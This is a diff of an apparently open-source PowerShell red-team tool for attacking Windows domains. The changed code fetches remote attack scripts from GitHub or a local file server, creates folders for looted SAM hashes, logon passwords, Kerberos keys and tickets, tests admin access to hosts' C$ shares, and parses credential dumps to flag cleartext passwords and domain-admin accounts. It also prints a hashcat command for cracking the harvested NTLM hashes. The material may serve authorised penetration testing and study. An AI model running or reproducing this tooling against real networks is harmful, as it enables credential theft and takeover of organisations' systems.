@@ -99,7 +99,7 @@ Write-Output $Banner
 Write-Host "Github  : "  -NoNewline
 Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -NoNewline
-Write-Host "0.3.8"
+Write-Host "0.3.9"
 Write-Host
 
 # If no targets have been provided
@@ -176,23 +176,26 @@ $InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyCo
 ################################################################################################################
 
 $PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
-$KirbyURL =  "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
+$KirbyURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
 
-# IF $LocalFileServer is not NULL, check if valid IP address 
-
+# Check if $LocalFileServer is not NULL
 if (![string]::IsNullOrEmpty($LocalFileServer)) {
+    # Regular expression pattern to validate an IP address
     $ipRegex = '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
 
     if ($LocalFileServer -match $ipRegex) {
+        # Update URLs to use the provided local file server's IP address
         $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
         $KirbyURL = "http://$LocalFileServer/Kirby.ps1"
     }
     else {
+        # If $LocalFileServer is not a valid IP address, show an error message and return
         Write-Host "[-] " -ForegroundColor "Red" -NoNewline
         Write-Host "The provided value '$LocalFileServer' is not a valid IP address."
         return
     }
 }
+
 
 
 ################################################################################################################
@@ -227,71 +230,23 @@ $UserFiles = Join-Path "$PME" "User Files"
 $Spraying = Join-Path $PME "Spraying"
 $VNC = Join-Path $PME "VNC"
 
-  if (-not (Test-Path $PME)) {
-    New-Item -ItemType Directory -Force -Path $PME  | Out-Null
-    Write-Host "[+] " -ForegroundColor "Green"  -NoNewline
-    Write-Host "Created directory for PME at $PME"
-    Write-Host
+  $directories = @(
+    $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
+    $LSA, $KerbDump, $MimiTickets, $ConsoleHistory, $Sessions, 
+    $UserFiles, $Spraying, $VNC
+)
 
-} 
-  if (-not (Test-Path $SAM)) {
-    New-Item -ItemType Directory -Force -Path $SAM  | Out-Null
-  }
-  
-  if (-not (Test-Path $LogonPasswords)) {
-    New-Item -ItemType Directory -Force -Path $LogonPasswords  | Out-Null
-  }
-  
-  if (-not (Test-Path $MSSQL)) {
-    New-Item -ItemType Directory -Force -Path $MSSQL  | Out-Null
-  }
-   
-   if (-not (Test-Path $SMB)) {
-    New-Item -ItemType Directory -Force -Path $SMB | Out-Null
-  }
-   
-   if (-not (Test-Path $Tickets)){
-    New-Item -ItemType Directory -Force -Path $Tickets  | Out-Null
-  }
-  
-  if (-not (Test-Path $ekeys)){
-    New-Item -ItemType Directory -Force -Path $ekeys  | Out-Null
+foreach ($directory in $directories) {
+    if (-not (Test-Path $directory)) {
+        New-Item -ItemType Directory -Force -Path $directory | Out-Null
+        if ($directory -eq $PME) {
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "Created directory for PME at $directory"
+            Write-Host
+            Start-sleep -seconds "3"
+        }
+    }
 }
-
-  if (-not (Test-Path $LSA)){
-    New-Item -ItemType Directory -Force -Path $LSA  | Out-Null
-}
-
-  if (-not (Test-Path $KerbDump)){
-    New-Item -ItemType Directory -Force -Path $KerbDump  | Out-Null
-}
-
-  if (-not (Test-Path $MimiTickets)){
-    New-Item -ItemType Directory -Force -Path $MimiTickets  | Out-Null
-}
-
-  if (-not (Test-Path $ConsoleHistory)){
-    New-Item -ItemType Directory -Force -Path $ConsoleHistory  | Out-Null
-}
-
-  if (-not (Test-Path $Sessions)){
-    New-Item -ItemType Directory -Force -Path $Sessions | Out-Null
-}
-
-  if (-not (Test-Path $UserFiles)){
-    New-Item -ItemType Directory -Force -Path $UserFiles | Out-Null
-
-}
-
-  if (-not (Test-Path $Spraying)){
-    New-Item -ItemType Directory -Force -Path $Spraying | Out-Null
-}
-
-  if (-not (Test-Path $VNC)){
-    New-Item -ItemType Directory -Force -Path $VNC | Out-Null
-}
-
-
 
 ######### Checks if user context is administrative when a session is spawned #########
 $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -356,7 +311,7 @@ if ($Targets -is [string]) {
 
 
 # Dispose the searcher after use
-#$searcher.Dispose()
+$searcher.Dispose()
 
 
 
@@ -757,107 +712,39 @@ if (!$CurrentUser) {
 
 if ($Method -eq "SessionHunter"){
     Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Searching for systems where privileged users credentials might be in running memory"
+    Write-Host "Searching for systems where privileged users' credentials might be in running memory"
     Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Filtering by those which we have admin rights to"
+    Write-Host "Filtering by those for which we have admin rights"
     Write-Host
     Start-Sleep -Seconds 3
 }
 
-if ($Module -eq "KerbDump"){
-    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Tickets will be written to $KerbDump"
+$moduleMessages = @{
+    "KerbDump"         = "Tickets will be written to $KerbDump"
+    "Tickets"          = "Tickets will be written to $MimiTickets"
+    "LSA"              = "LSA output will be written to $LSA"
+    "ekeys"            = "eKeys output will be written to $ekeys"
+    "SAM"              = "SAM output will be written to $SAM"
+    "LogonPasswords"   = "LogonPasswords output will be written to $LogonPasswords"
+    "ConsoleHistory"   = "Console History output will be written to $ConsoleHistory"
+    "Files"            = "File output will be written to $UserFiles"
+}
 
+if ($moduleMessages.ContainsKey($Module)) {
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host $moduleMessages[$Module]
+    
     if (!$ShowOutput){
         Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Use -ShowOutput to show results in the console"
+        Write-Host "Use -ShowOutput to display results in the console"
         ""
     }
 }
-
-elseif ($Module -eq "Tickets"){
-    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Tickets will be written to $MimiTickets"
-
-    if (!$ShowOutput){
-        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Use -ShowOutput to show results in the console"
-        ""
-    }
-}
-
-elseif ($Module -eq "LSA"){
-    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "LSA output will be written to $LSA"
-    #""
-    if (!$ShowOutput){
-        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Use -ShowOutput to show results in the console"
-        ""
-    }
-}
-
-elseif ($Module -eq "ekeys"){
-    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "eKeys output will be written to $ekeys"
-    #""
-    if (!$ShowOutput){
-        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Use -ShowOutput to show results in the console"
-        ""
-    }
-}
-
-elseif ($Module -eq "SAM"){
-    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "SAM output will be written to $SAM"
-
-    if (!$ShowOutput){
-        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Use -ShowOutput to show results in the console"
-        ""
-    }
-}
-
-elseif ($Module -eq "LogonPasswords"){
-    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "LogonPasswords output will be written to $LogonPasswords"
-
-    if (!$ShowOutput){
-        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Use -ShowOutput to show results in the console"
-        ""
-    }
-}
-
-elseif ($Module -eq "ConsoleHistory"){
-    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Console History output will be written to $ConsoleHistory"
-
-    if (!$ShowOutput){
-        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Use -ShowOutput to show results in the console"
-        ""
-    }
-}
-
-elseif ($Module -eq "Files"){
-    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "File output will be written to $UserFiles"
-
-    if (!$ShowOutput){
-        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Use -ShowOutput to show results in the console"
-        ""
-    }
-}
-
-
-
 elseif ($Method -eq "GenRelayList"){
     Write-Host "- " -ForegroundColor "Yellow" -NoNewline
     Write-Host "SMB Signing output will be written to $SMB"
 }
+
 
 ################################################################################################################
 ######################################## Local scripts and modules #############################################
@@ -1552,18 +1439,20 @@ if ($wait) {
 $tcpClient.Close()
 if (!$connected) {return "Unable to connect" }   
     
-    $Error.Clear()
 
-    ls \\$ComputerName\c$ > $null
+$Error.Clear()
 
-        $OurError=$Error[0]
+try {
+    ls "\\$ComputerName\c$" > $null
 
-        if (($OurError) -eq $null){
-            if ($Command -eq ""){
-                return "Successful Connection PME"
-            }
-        }
-        else {return "Access Denied"}
+    if ([string]::IsNullOrWhiteSpace($Command)) {
+        return "Successful Connection PME"
+    }
+}
+catch {
+    return "Access Denied"
+}
+
 
 
 
@@ -1693,7 +1582,7 @@ while (`$true) {
 		return "Timed Out"
 
 	} catch {
-		Write-Output "[$($ComputerName)]: An unexpected error occurred"
+		Write-Output "unexpected error"
 		Write-Output ""
 		return
 	}
@@ -1806,9 +1695,9 @@ do {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                 continue
             } 
-            elseif ($result -eq "Unspecified Error") {
+            elseif ($result -eq "Unexpected Error") {
                 if ($successOnly) { continue }
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                 continue
             } 
             elseif ($result -eq "Timed Out") {
@@ -3989,93 +3878,118 @@ $runspacePool.Dispose()
 }
 
 ################################################################################################################
+################################################# Function: AdminCount #########################################
+################################################################################################################
+
+function AdminCount {
+    param (
+        [string]$UserName,
+        [System.DirectoryServices.DirectorySearcher]$Searcher
+    )
+
+    $Searcher.Filter = "(sAMAccountName=$UserName)"
+    $Searcher.PropertiesToLoad.Clear()
+    $Searcher.PropertiesToLoad.Add("adminCount") > $null
+
+    $user = $Searcher.FindOne()
+
+    if ($user -ne $null) {
+        $adminCount = $user.Properties["adminCount"]
+        if ($adminCount -eq 1) {
+            return $true
+        }
+    }
+    return $false
+}
+
+################################################################################################################
 ################################################## Function: Parse-SAM #########################################
 ################################################################################################################
 function Parse-SAM {
-        $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
-        if (-not $SamFull) {
-            New-Item -Path "$PME\SAM\" -Name ".Sam-Full.txt" -ItemType "File" | Out-Null
-        }
+    $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
+    if (-not $SamFull) {
+        New-Item -Path "$PME\SAM\" -Name ".Sam-Full.txt" -ItemType "File" | Out-Null
+    }
 
-        Write-Host
-        Write-Host
-        Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
-        Write-Host
+    Write-Host
+    Write-Host
+    Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
+    Write-Host
 
-        $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
-        $lines = @{}
+    $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
+    $lines = @{}
 
-        foreach ($file in $files) {
-            $fileLines = Get-Content $file
+    foreach ($file in $files) {
+        $fileLines = Get-Content $file
 
-            foreach ($line in $fileLines) {
-                if ([string]::IsNullOrWhiteSpace($line)) {
-                    continue
-                }
+        foreach ($line in $fileLines) {
+            if ([string]::IsNullOrWhiteSpace($line)) {
+                continue
+            }
 
-                $lineParts = $line -split ':'
-                $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
-                $computer = $file.BaseName -split '\.' | Select-Object -First 1
-                $computerFormed = "{0}" -f $computer
+            $lineParts = $line -split ':'
+            $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
+            $computer = $file.BaseName -split '\.' | Select-Object -First 1
+            $computerFormed = "{0}" -f $computer
 
-                if ($lines.ContainsKey($lineWithoutNumber)) {
-                    $lines[$lineWithoutNumber] += "," + $computerFormed
-                } else {
-                    $lines[$lineWithoutNumber] = $computerFormed
-                }
+            if ($lines.ContainsKey($lineWithoutNumber)) {
+                $lines[$lineWithoutNumber] += "," + $computerFormed
+            } else {
+                $lines[$lineWithoutNumber] = $computerFormed
             }
         }
+    }
 
-        $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
-        if ($duplicateLines) {
-            foreach ($duplicate in $duplicateLines) {
-                $line = $duplicate.Key
-                $computers = $duplicate.Value -split ','
-                Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
-                Write-Host "$line::"
-                Write-Host
+    $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
+    if ($duplicateLines) {
+        foreach ($duplicate in $duplicateLines) {
+            $line = $duplicate.Key
+            $computers = $duplicate.Value -split ','
+            Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
+            Write-Host "$line::"
+            Write-Host
+        }
+    }
+
+    Write-Host
+    Write-Host "------------------------------ All collected SAM Hashes ----------------------------------------" -ForegroundColor "Yellow"
+    Write-Host
+
+    Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
+        $Computer = $_.BaseName -split '\.' | Select-Object -First 1
+        $ComputerFormed = "[{0}]" -f $Computer
+        $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
+        $content = Get-Content $_.FullName -Verbose
+        $output = foreach ($line in $content) {
+            $trimmedLine = $line.Trim()
+            if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt $ComputerFormed.Length) {
+                $ComputerFormed + $trimmedLine
             }
         }
+        $output | Out-File "$SAM\.Sam-Full.txt" -Force "ascii" -Append
+    }
 
-        Write-Host
-        Write-Host "------------------------------ All collected SAM Hashes ----------------------------------------" -ForegroundColor "Yellow"
-        Write-Host
+    Start-Sleep -Seconds "3"
+    (Get-Content "$SAM\.Sam-Full.txt") | Sort-Object -Unique | Sort | Out-File "$SAM\.Sam-Full.txt" -Encoding "ASCII"
+    Get-Content "$SAM\.Sam-Full.txt"
 
-        Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
-            $Computer = $_.BaseName -split '\.' | Select-Object -First 1
-            $ComputerFormed = "[{0}]" -f $Computer
-            $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
-            $content = Get-Content $_.FullName -Verbose
-            $output = foreach ($line in $content) {
-                $trimmedLine = $line.Trim()
-                if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt $ComputerFormed.Length) {
-                    $ComputerFormed + $trimmedLine
-                }
-            }
-            $output | Out-File "$SAM\.Sam-Full.txt" -Force "ascii" -Append
-        }
-
-        Start-Sleep -Seconds "3"
-        (Get-Content "$SAM\.Sam-Full.txt") | Sort-Object -Unique | Sort | Out-File "$SAM\.Sam-Full.txt" -Encoding "ASCII"
-        Get-Content "$SAM\.Sam-Full.txt"
-
-        Write-Host ""
-        Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
-        Write-Host ""
-        Write-Host "All SAM hashes written to $PME\SAM\.Sam-Full.txt" -ForegroundColor "Yellow"
-        Write-Host ""
+    Write-Host ""
+    Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
+    Write-Host ""
+    Write-Host "All SAM hashes written to $PME\SAM\.Sam-Full.txt" -ForegroundColor "Yellow"
+    Write-Host ""
 }
+
 
 ################################################################################################################
 ################################################# Function: Parse-LogonPassword ################################
 ################################################################################################################
 function Parse-LogonPasswords {
-
     Write-Host
     Write-Host
     Write-Host "Parsing Results" -ForegroundColor "Yellow"
     Write-Host
-    Start-Sleep -Seconds "1"
+    Start-Sleep -Seconds 1
 
     function Parse-LogonPassword {
         param (
@@ -4146,27 +4060,6 @@ function Parse-LogonPasswords {
         }
     }
 
-    function AdminCount {
-        param (
-            [string]$UserName,
-            [System.DirectoryServices.DirectorySearcher]$Searcher
-        )
-
-        $Searcher.Filter = "(sAMAccountName=$UserName)"
-        $Searcher.PropertiesToLoad.Clear()
-        $Searcher.PropertiesToLoad.Add("adminCount") > $null
-
-        $user = $Searcher.FindOne()
-
-        if ($user -ne $null) {
-            $adminCount = $user.Properties["adminCount"]
-            if ($adminCount -eq 1) {
-                return $true
-            }
-        }
-        return $false
-    }
-
     # Directory path where the text files are located.
     $LogonPasswordPath = "$LogonPasswords"
 
@@ -4179,10 +4072,10 @@ function Parse-LogonPasswords {
     # Loop through each file in the directory.
     foreach ($File in $Files) {
         # Extract computer name (DNS Hostname) from the file name using regex.
-        $ComputerFileName = $File.BaseName -replace "-LogonPasswords$", ""
+        $Computer = $File.BaseName -replace "-LogonPasswords$", ""
 
         Write-Host
-        Write-Host "-[$ComputerFileName]-"
+        Write-Host "-[$Computer]-"
         Write-Host
 
         # Retrieve the content of the current file.
@@ -4204,6 +4097,8 @@ function Parse-LogonPasswords {
         Where-Object { $_.NTLM -or $_.Password } |
         ForEach-Object {
             $notesAdditions = @()
+            New-Item -ItemType "Directory" -Path $LogonPasswords -Name $Computer -Force | Out-Null
+            $ComputerDirectory = "$LogonPasswords\$Computer"
 
             $userName = ($_.Identity -split '\\')[1]  # Extract username from Identity
 
@@ -4229,9 +4124,10 @@ function Parse-LogonPasswords {
 
             $_.Notes += ($notesAdditions -join ' ')
 
-            Write-Host "Username  : $($_.Identity)"
+            Write-Host "Username  : $($_.Identity.ToLower())"
             Write-Host "NTLM      : $($_.NTLM)"
-            Write-Host "Password  : $($_.Password)"
+            if ($($_.Password) -eq $null) {} Else {Write-Host "Password  : $($_.Password)"}
+            if (($_.Notes) -eq ""){} Else {
             Write-Host "Notes     : " -NoNewline
 
             # Highlight notes in yellow if it contains specific flags
@@ -4243,22 +4139,25 @@ function Parse-LogonPasswords {
             Write-Host ""
             Write-Host ""
             "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force
+            }
+            
+            Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
         }
     }
 
     Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Sort | Get-unique | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
     
-    # Sometimes blanks NTLM values are duplicated, this should ensure they are removed from the file
+    # Sometimes blank NTLM values are duplicated, this should ensure they are removed from the file
     $filteredContent = Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Where-Object {$_ -notmatch ":$"}
     $filteredContent | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
 
     # Print unique NTLM hashes within the banner
     Write-Host
-    Write-Host "-------------------------------------- All collected NTLM Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
+    Write-Host "-------------------------------------- All collected NTLM User Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
     Write-Host
     Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt"
     Write-Host
-    Write-Host "----------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
+    Write-Host "---------------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
     Write-Host 
     Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
     Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
@@ -4268,132 +4167,262 @@ function Parse-LogonPasswords {
 
 
 
+
 ################################################################################################################
 ################################################# Function: Parse-eKeys ########################################
 ################################################################################################################
 Function Parse-eKeys {
+    Write-Host
+    Write-Host
+    Write-Host "Parsing Results" -ForegroundColor "Yellow"
+    Write-Host
+    Start-Sleep -Seconds "1"
+    $outputFilePath = "$ekeys\.eKeys-Parsed.txt"
 
+    # Initialize the DirectorySearcher outside of the loop for better performance
+    $domainSearcher = New-Object System.DirectoryServices.DirectorySearcher
+
+    Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
+        $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
+        
+        New-Item -ItemType "Directory" -Path $eKeys -Name $Computer -Force | Out-Null
+        $ComputerDirectory = "$eKeys\$Computer"
+        
         Write-Host
         Write-Host
-        Write-Host "Parsing Results" -ForegroundColor "Yellow"
+        Write-Host "-[$Computer]-"
         Write-Host
-        Start-Sleep -Seconds "1"
-        $outputFilePath = "$ekeys\.eKeys-Parsed.txt"
 
-        # Initialize the DirectorySearcher outside of the loop for better performance
-        $domainSearcher = New-Object System.DirectoryServices.DirectorySearcher
+        $filePath = $_.FullName
+        $fileContent = Get-Content -Path $filePath -Raw
+        Move-Item -Path $filePath -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
 
-        Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
-            $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
-            Write-Host
-            Write-Host
-            Write-Host "-[$Computer]-"
-            Write-Host
+        $pattern = '(?ms)\s\*\sUsername\s:\s(.+?)\s*\r?\n\s*\*\s+Domain\s+:\s(.+?)\s*\r?\n\s*\*\s+Password\s:\s(.+?)\s*\r?\n\s*\*\s+Key List\s:\s(.*?)(?=\r?\n\s\*\sUsername\s:|\r?\n\r?\n)'
+        $matches = [regex]::Matches($fileContent, $pattern)
 
-            $filePath = $_.FullName
-            $fileContent = Get-Content -Path $filePath -Raw
+        $uniqueGroups = @{}
 
-            $pattern = '(?ms)\s\*\sUsername\s:\s(.+?)\s*\r?\n\s*\*\s+Domain\s+:\s(.+?)\s*\r?\n\s*\*\s+Password\s:\s(.+?)\s*\r?\n\s*\*\s+Key List\s:\s(.*?)(?=\r?\n\s\*\sUsername\s:|\r?\n\r?\n)'
-            $matches = [regex]::Matches($fileContent, $pattern)
+        foreach ($match in $matches) {
+            $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'
+            if (([regex]::Matches($password, ' ')).Count -gt 10) {
+                $password = "(Hex Value: Redacted)"
+            }            
+            
+            $domainUsername = "$($domain.ToLower())\$username"
+            $groupKey = $domainUsername
 
-            $uniqueGroups = @{}
+            if (!$uniqueGroups.ContainsKey($groupKey)) {
+                $notes = ""  # This will store the notes
 
-foreach ($match in $matches) {
-    $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'
-    if (([regex]::Matches($password, ' ')).Count -gt 10) {
-        $password = "(Hex Value: Redacted)"
-    }
-    $domainUsername = "$($domain.ToLower())\$username"
-    $groupKey = $domainUsername
-    
+                # Check for non-null passwords and username not ending with $
+                if ($password -ne "(null)" -and $password -ne "(Hex Value: Redacted)" -and ($username -notmatch '\$$')) {
+                    $notes += "[Cleartext Password] "
+                }
 
-if (!$uniqueGroups.ContainsKey($groupKey)) {
-    $notes = ""  # This will store the notes
-    
-    # Check for non-null passwords and username not ending with $
-    if ($password -ne "(null)" -and $password -ne "(Hex Value: Redacted)" -and ($username -notmatch '\$$')) {
-        $notes += "[Cleartext Password] "
-    }
-    
-    
-    $isAdminGroupMember = $DomainAdmins -contains $username -or
-                            $EnterpriseAdmins -contains $username -or
-                            $ServerOperators -contains $username -or
-                            $AccountOperators -contains $username
+                $isAdminGroupMember = $DomainAdmins -contains $username -or
+                                    $EnterpriseAdmins -contains $username -or
+                                    $ServerOperators -contains $username -or
+                                    $AccountOperators -contains $username
 
-    # Do not display the adminCount if a user is a member of the specified groups
-    if (-not $isAdminGroupMember -and (AdminCount -UserName $username -Searcher $domainSearcher)) {
-        $notes += "[AdminCount=1] "
-    }
+                # Do not display the adminCount if a user is a member of the specified groups
+                if (-not $isAdminGroupMember -and (AdminCount -UserName $username -Searcher $domainSearcher)) {
+                    $notes += "[AdminCount=1] "
+                }
 
-    # Check for Empty Password hash
-    if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
-        $notes += "[rc4_hmac_nt=Empty Password] "
-    }
+                # Check for Empty Password hash
+                if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
+                    $notes += "[rc4_hmac_nt=Empty Password] "
+                }
 
-    # Checks for group memberships
-    if ($DomainAdmins -contains $username) {
-        $notes += "[Domain Admin] "
-    }
-    if ($EnterpriseAdmins -contains $username) {
-        $notes += "[Enterprise Admin] "
-    }
-    if ($ServerOperators -contains $username) {
-        $notes += "[Server Operator] "
-    }
-    if ($AccountOperators -contains $username) {
-        $notes += "[Account Operator] "
-    }
+                # Checks for group memberships
+                if ($DomainAdmins -contains $username) {
+                    $notes += "[Domain Admin] "
+                }
+                if ($EnterpriseAdmins -contains $username) {
+                    $notes += "[Enterprise Admin] "
+                }
+                if ($ServerOperators -contains $username) {
+                    $notes += "[Server Operator] "
+                }
+                if ($AccountOperators -contains $username) {
+                    $notes += "[Account Operator] "
+                }
 
-    $group = [PSCustomObject]@{
-        DomainUsername = $domainUsername
-        KeyList = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
-        Password = $password
-        Notes = $notes
-    }
+                $group = [PSCustomObject]@{
+                    DomainUsername = $domainUsername
+                    KeyList = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
+                    Password = $password
+                    Notes = $notes
+                }
 
-    $uniqueGroups[$groupKey] = $group
+                $uniqueGroups[$groupKey] = $group
 
-    Write-Host "Username    : $domainUsername"
-    if (-not [string]::IsNullOrWhiteSpace($notes)) {
-        Write-Host "Notes       : " -NoNewline
-        Write-Host $notes -ForegroundColor Yellow -NoNewline
-        Write-Host ""
-    }
-    Write-Host "Password    : $password"
+                Write-Host "Username    : $domainUsername"
+                if ($Password -eq "(null)" -or $Password -eq "" -or $Password -eq $null){} Else {Write-Host "Password    : $password"}
 
-    foreach ($key in $group.KeyList) {
-        if (![string]::IsNullOrWhiteSpace($key)) {
-            $keyParts = $key.Trim() -split '\s+'
-            Write-Host "$($keyParts[0]) : $($keyParts[1])"
-        }
-    }
+                foreach ($key in $group.KeyList) {
+                    if (![string]::IsNullOrWhiteSpace($key)) {
+                        $keyParts = $key.Trim() -split '\s+'
+                        Write-Host "$($keyParts[0]) : $($keyParts[1])"
+                    }
+                }
+                                if (-not [string]::IsNullOrWhiteSpace($notes)) {
+                    Write-Host "Notes       : " -NoNewline
+                    Write-Host $notes -ForegroundColor Yellow -NoNewline
+                    Write-Host ""
+                }
 
-    Write-Host ""
-}
+                Write-Host ""
             }
-       }
-}
-
-function AdminCount {
-    param (
-        [string]$UserName,
-        [System.DirectoryServices.DirectorySearcher]$Searcher
-    )
-
-    $Searcher.Filter = "(sAMAccountName=$UserName)"
-    $Searcher.PropertiesToLoad.Clear()
-    $Searcher.PropertiesToLoad.Add("adminCount") > $null
-
-    $user = $Searcher.FindOne()
-
-    if ($user -ne $null) {
-        $adminCount = $user.Properties["adminCount"]
-        if ($adminCount -eq 1) {
-            return $true
         }
     }
-    return $false
+
+}
+
+
+
+################################################################################################################
+############################################## Function: Parse-KerbDump ########################################
+################################################################################################################
+
+function Parse-KerbDump {
+    Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
+    Start-sleep -Seconds "2"
+
+    # Initialize DirectorySearcher
+    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
+    $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")
+
+    # Grab each candidate file for parsing based on the name ending in "KerbDump.txt"
+    Get-ChildItem -Path $KerbDump -Filter "*KerbDump.txt" | 
+        Where-Object { $_.Length -gt 0 } | 
+        ForEach-Object {
+            $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
+            
+            # Create the following flag to track output later
+            $DisplayComputerName = $True
+
+            # Create a directory in the name of the computer from which results are parsed from
+            New-Item -ItemType "Directory" -Path $KerbDump -Name $Computer -Force | Out-Null
+            $ComputerDirectory = "$KerbDump\$Computer"
+
+            # Read the file content
+            $FileContent = Get-Content -Path $_.FullName -Raw
+
+            # Define regex pattern to match ticket details
+            $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"
+
+            # Match and extract details
+            $matches = [regex]::Matches($fileContent, $pattern)
+            foreach ($match in $matches) {
+                $data = @{
+                    ServiceName     = $match.Groups[1].Value
+                    EncryptionType  = $match.Groups[2].Value
+                    TicketExp       = $match.Groups[3].Value
+                    ServerName      = $match.Groups[4].Value
+                    UserName        = $match.Groups[5].Value
+                    Flags           = $match.Groups[6].Value
+                    SessionKeyType  = $match.Groups[7].Value
+                }
+
+                # Transform the username into a more common format "DOMAIN\Username"
